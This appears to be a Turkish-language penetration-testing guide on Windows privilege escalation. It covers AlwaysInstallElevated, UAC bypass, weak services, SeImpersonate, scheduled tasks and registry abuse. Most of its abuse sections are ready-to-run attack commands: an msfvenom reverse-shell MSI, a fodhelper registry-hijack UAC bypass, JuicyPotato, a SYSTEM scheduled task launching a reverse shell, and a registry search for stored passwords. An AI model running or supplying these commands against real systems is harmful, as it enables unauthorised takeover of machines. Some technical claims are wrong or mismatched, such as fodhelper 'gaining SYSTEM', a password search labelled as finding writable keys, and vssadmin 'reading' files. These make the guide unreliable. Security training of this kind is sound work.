**Windows Privilege Escalation: Abusing Windows Features (Windows Özelliklerinin Kötüye Kullanılması)**

Windows işletim sisteminde yerleşik olarak bulunan bazı özellikler, yanlış yapılandırıldığında veya zafiyet içerdiğinde saldırganlar tarafından yetki yükseltmek için kullanılabilir. Bu bölümde Windows'un popüler özelliklerinin nasıl kötüye kullanılabileceği detaylı şekilde açıklanmıştır.

---

### **5.1. AlwaysInstallElevated (Her Zaman Yüksekte Çalıştır)**

Windows Installer, uygulamaları yüklemek için kullanılan bir özelliktir. **AlwaysInstallElevated** ilkesinin etkin olduğu sistemlerde, kullanıcıların SYSTEM yetkisiyle MSI dosyaları çalıştırmasına izin verilir.

#### **Nasıl Çalışır?**
- **AlwaysInstallElevated** ilkesi hem `HKLM` hem de `HKCU` kayıt defteri anahtarlarında etkinse, saldırgan SYSTEM yetkisiyle kod çalıştırabilir.

#### **Tespit**
1. AlwaysInstallElevated ayarını kontrol edin:
   ```cmd
   reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```

2. Her iki anahtarda da `0x1` değeri varsa bu özellik etkin.

#### **Kötüye Kullanma**
1. Zararlı bir MSI dosyası oluşturun:
   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi > malicious.msi
   ```

2. MSI dosyasını SYSTEM yetkisiyle çalıştırın:
   ```cmd
   msiexec /quiet /qn /i C:\path\to\malicious.msi
   ```

---

### **5.2. User Account Control (UAC) Bypass**

UAC, Windows'ta zararlı işlemleri engellemek için tasarlanmıştır. Ancak bazı durumlarda, zayıf yapılandırmalar veya uygulama özellikleri kullanılarak atlatılabilir.

#### **Tespit**
- Kullanıcının UAC seviyesini kontrol edin:
  ```cmd
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
  ```

#### **Kötüye Kullanma**
1. UAC bypass araçlarından birini kullanın:
   - **Fodhelper Exploit:** `fodhelper.exe` ile SYSTEM yetkisi kazanın.
   ```cmd
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
   fodhelper.exe
   ```
2. Metasploit üzerinden bir modül kullanabilirsiniz:
   ```cmd
   use exploit/windows/local/bypassuac
   ```

---

### **5.3. Windows Services (Hizmetlerin Kötüye Kullanılması)**

Windows hizmetleri, genellikle SYSTEM yetkisiyle çalışır. Zayıf yapılandırılmış hizmetler privilege escalation için kullanılabilir.

#### **Tespit**
1. Hizmetleri listeleyin:
   ```cmd
   sc query
   ```
2. Zayıf hizmet yollarını kontrol edin:
   ```cmd
   wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
   ```

#### **Kötüye Kullanma**
- **Unquoted Service Path:** Tırnaksız hizmet yollarını kullanarak zararlı bir dosya yerleştirin.
- **Weak Permissions:** Hizmet dosyalarına veya yapılandırmalarına yazılabilirlik varsa dosyayı değiştirin.

---

### **5.4. SeImpersonatePrivilege Abuse**

**SeImpersonatePrivilege**, bir işlemin başka bir kullanıcının bağlamında çalışmasına izin verir. Bu ayrıcalık, SYSTEM yetkisiyle çalışan işlemleri taklit etmek için kullanılabilir.

#### **Tespit**
- Ayrıcalıkları kontrol edin:
  ```cmd
  whoami /priv
  ```

#### **Kötüye Kullanma**
1. JuicyPotato veya PrintSpoofer gibi araçlarla bu ayrıcalığı kullanarak SYSTEM yetkisi kazanın:
   ```cmd
   JuicyPotato.exe -l 1337 -p cmd.exe -t *
   ```

---

### **5.5. Windows Task Scheduler Abuse**

Zamanlanmış görevler, genellikle SYSTEM yetkisiyle çalıştırılır. Yanlış yapılandırılmış görevler privilege escalation için kullanılabilir.

#### **Kötüye Kullanma**
1. Yeni bir görev oluşturun:
   ```cmd
   schtasks /create /tn "EvilTask" /tr "C:\path\to\reverse_shell.exe" /sc onlogon /ru SYSTEM
   ```

2. Görevi çalıştırarak SYSTEM yetkisi kazanın:
   ```cmd
   schtasks /run /tn "EvilTask"
   ```

---

### **5.6. Windows Subsystem for Linux (WSL) Abuse**

Windows Subsystem for Linux (WSL), Windows üzerinde bir Linux ortamı sağlar. Yanlış yapılandırmalar veya güvenlik açıkları privilege escalation için kullanılabilir.

#### **Tespit**
- WSL'nin yüklü olup olmadığını kontrol edin:
  ```cmd
  wsl --list
  ```

#### **Kötüye Kullanma**
1. WSL ortamında zararlı bir dosya çalıştırarak Windows dosya sistemine erişim sağlayabilirsiniz.

---

### **5.7. Registry Keys Abuse (Kayıt Defteri Anahtarlarının Kötüye Kullanılması)**

Bazı kritik kayıt defteri anahtarlarının izinleri zayıfsa, bu anahtarları değiştirerek privilege escalation sağlanabilir.

#### **Kötüye Kullanma**
1. Yazılabilir bir kayıt defteri anahtarı bulun:
   ```cmd
   reg query HKLM /s /f "password" /t REG_SZ
   ```
2. Anahtarı değiştirerek zararlı bir komut ekleyin:
   ```cmd
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\reverse_shell.exe" /f
   ```

---

### **5.8. SeBackupPrivilege Abuse**

**SeBackupPrivilege** ayrıcalığı, dosya ve dizinlerin yedeklenmesi için kullanılır. Bu ayrıcalık, genellikle hassas dosyalara erişmek için kullanılabilir.

#### **Kötüye Kullanma**
1. Yedekleme ayrıcalığını kontrol edin:
   ```cmd
   whoami /priv
   ```
2. Bu ayrıcalığı kullanarak hassas dosyaları okuyun:
   ```cmd
   vssadmin list shadows
   ```

---

### **Araçlar ve Komutlar**
- **JuicyPotato / PrintSpoofer:** SeImpersonatePrivilege abuse için.
- **AccessChk:** Dosya, hizmet ve kayıt defteri izinlerini kontrol etmek için.
- **Metasploit:** UAC bypass ve Windows özelliklerini exploit etmek için.

---
